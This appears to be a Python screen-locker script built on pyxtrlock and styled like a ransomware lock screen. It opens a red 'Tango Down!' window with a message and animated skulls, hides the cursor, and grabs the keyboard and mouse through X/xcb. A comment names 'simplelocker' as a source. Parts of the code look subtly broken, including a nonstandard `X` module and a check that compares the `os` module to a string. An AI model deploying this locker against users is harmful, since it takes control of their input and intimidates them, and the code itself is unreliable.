import xcb
import tkinter as tk
from tkinter import *
from tkinter.ttk import *
from ctypes import POINTER, c_int, c_uint32
from ctypes import byref, cast
import pwd, os, sys, socket, string, platform, threading, time
import X

# Invisible mouse pointer
EMPTY_CURSOR = {
    "width": 1,
    "height": 1,
    "x_hot": 1,
    "y_hot": 1,
    "fg_bitmap": bytes([0x00]),
    "bg_bitmap": bytes([0x00]),
    "color_mode": "named",
    "bg_color": "steelblue3",
    "fg_color": "grey25",
}

UNCHANGED_CURSOR = None

XDG_CONFIG_HOME = os.environ.get("XDG_CONFIG_HOME") or os.path.expanduser("~/.config")


def panic(message, exit_code=1):
    """Print an error message to stderr and exit"""
    print(message, file=sys.stderr)
    sys.exit(exit_code)


class App(tk.Tk):
    def __init__(self, master=None):
        super().__init__(master)
        self.title(string="Tango Down!")  # Set window title
        # self.resizable(0,0) # Do not allow to be resized
        self.config(background="#722020")


class mainwindow(tk.Canvas):
    def __init__(self, app, config):
        super().__init__(app, width=1600, height=1200, highlightthickness=0)
        self.config(background="#722020")

        self.style = Style()
        self.style.theme_use("clam")

        Label(
            self,
            text="",
            background="#722020",
        ).grid(row=0, column=0, columnspan=12, pady=(50, 50))

        Label(
            self,
            text=config["message"],
            font="FreeMono 18 bold",
            foreground="white",
            background="#722020",
            wraplength=1000,
        ).grid(row=1, column=2, columnspan=8, pady=(30, 50))

        self.pack()

        def start_thread():
            # Start timer as thread
            thread = threading.Thread(target=start_gif)
            thread.daemon = True
            thread.start()

        def start_gif(frame_num=0):
            frames = []
            for frame in config["skull"]:
                frame_img = PhotoImage(data=frame)
                # frame_img = frame_img.subsample(3)
                frames.append(frame_img)

            try:
                frame_num = 1  # 380 Minuten (VS38 => 380 ;-)
                while frame_num:
                    frame_img = frames[frame_num % len(frames)]
                    label = Label(self, image=frame_img, background="#722020")
                    label.image = frame_img  # keep a reference!
                    label.grid(row=3, column=2, columnspan=3, rowspan=3, pady=(30, 30))

                    label = Label(self, image=frame_img, background="#722020")
                    label.image = frame_img  # keep a reference!
                    label.grid(row=3, column=7, columnspan=3, rowspan=3, pady=(30, 30))

                    time.sleep(0.2)
                    frame_num += 1

            except KeyboardInterrupt:
                print("Closed...")

        photo = PhotoImage(data=config["image_b64"])
        photo = photo.subsample(3)

        label = Label(self, image=photo, background="#722020")
        label.image = photo  # keep a reference!
        label.grid(row=3, column=5, columnspan=2, rowspan=2, pady=(140, 30))

        if os == "Windows":
            pass
        else:
            start_thread()


# create cursor from bitmap from original simplelocker
def create_cursor(conn, window, screen, cursor):
    csr_map = xcb.image_create_pixmap_from_bitmap_data(
        conn,
        window,
        cursor["fg_bitmap"],
        cursor["width"],
        cursor["height"],
        1,
        0,
        0,
        None,
    )
    csr_mask = xcb.image_create_pixmap_from_bitmap_data(
        conn,
        window,
        cursor["bg_bitmap"],
        cursor["width"],
        cursor["height"],
        1,
        0,
        0,
        None,
    )

    if cursor["color_mode"] == "named":
        csr_bg = xcb.alloc_named_color_sync(
            conn, screen.default_colormap, cursor["bg_color"]
        )
        csr_fg = xcb.alloc_named_color_sync(
            conn, screen.default_colormap, cursor["fg_color"]
        )
    elif cursor["color_mode"] == "rgb":
        r, g, b = cursor["bg_color"]
        csr_bg = xcb.alloc_color_sync(conn, screen.default_colormap, r, g, b)
        r, g, b = cursor["fg_color"]
        csr_fg = xcb.alloc_color_sync(conn, screen.default_colormap, r, g, b)
    else:
        panic("Invalid color mode")

    try:
        return xcb.create_cursor_sync(
            conn, csr_map, csr_mask, csr_fg, csr_bg, cursor["x_hot"], cursor["y_hot"]
        )
    except xcb.XCBError:
        panic("pyxtrlock: Could not create cursor")


def lock_screen(myapp, hide_cursor: bool):
    display = X.create_window_x(None)
    conn = X.get_xcb_connection(display)

    if not display:
        panic("pyxtrlock: Could not connect to X server")

    screen_num = c_int()

    setup = xcb.get_setup(conn)

    iter_ = xcb.setup_roots_iterator(setup)

    while screen_num.value:
        xcb.screen_next(byref(iter_))
        screen_num.value -= 1

    screen = iter_.data.contents

    # create window
    window = xcb.generate_id(conn)

    attribs = (c_uint32 * 2)(1, xcb.EVENT_MASK_KEY_PRESS)
    xcb.create_window(
        conn,
        xcb.COPY_FROM_PARENT,
        window,
        screen.root,
        0,
        0,
        1,
        1,
        0,
        xcb.WINDOW_CLASS_INPUT_ONLY,
        xcb.VisualID(xcb.COPY_FROM_PARENT),
        xcb.CW_OVERRIDE_REDIRECT | xcb.CW_EVENT_MASK,
        cast(byref(attribs), POINTER(c_uint32)),
    )

    if hide_cursor:
        cursor = create_cursor(conn, window, screen, EMPTY_CURSOR)
    else:
        cursor = 0  # keep mouse pointer as it is

    # map window
    xcb.map_window(conn, window)

    # Grab keyboard
    try:
        status = xcb.grab_keyboard_sync(
            conn, 0, window, xcb.CURRENT_TIME, xcb.GRAB_MODE_ASYNC, xcb.GRAB_MODE_ASYNC
        )

        if status != xcb.GrabSuccess:
            panic("pyxtrlock: Could not grab keyboard")
    except xcb.XCBError as err:
        panic("pyxtrlock: Could not grab keyboard " + str(err))

    # Grab pointer
    # Use the method from the original xtrlock code:
    #  "Sometimes the WM doesn't ungrab the keyboard quickly enough if
    #  launching xtrlock from a keystroke shortcut, meaning xtrlock fails
    #  to start We deal with this by waiting (up to 100 times) for 10,000
    #  microsecs and trying to grab each time. If we still fail
    #  (i.e. after 1s in total), then give up, and emit an error"
    for _ in range(100):
        try:
            status = xcb.grab_pointer_sync(
                conn,
                False,
                window,
                0,
                xcb.GRAB_MODE_ASYNC,
                xcb.GRAB_MODE_ASYNC,
                xcb.WINDOW_NONE,
                cursor,
                xcb.CURRENT_TIME,
            )

            if status == xcb.GrabSuccess:
                break
            else:
                time.sleep(0.01)
        except xcb.XCBError:
            time.sleep(0.01)
    else:
        panic("pyxtrlock: Could not grab pointing device")

    xcb.flush(conn)

    # Prepare X Input
    im = X.open_IM(display, None, None, None)
    if not im:
        panic("pyxtrlock: Could not open Input Method")

    ic = X.create_IC(
        im, X.N_INPUT_STYLE, X.IM_PRE_EDIT_NOTHING | X.IM_STATUS_NOTHING, None
    )
    if not ic:
        panic("pyxtrlock: Could not open Input Context")

    X.set_ic_focus(ic)
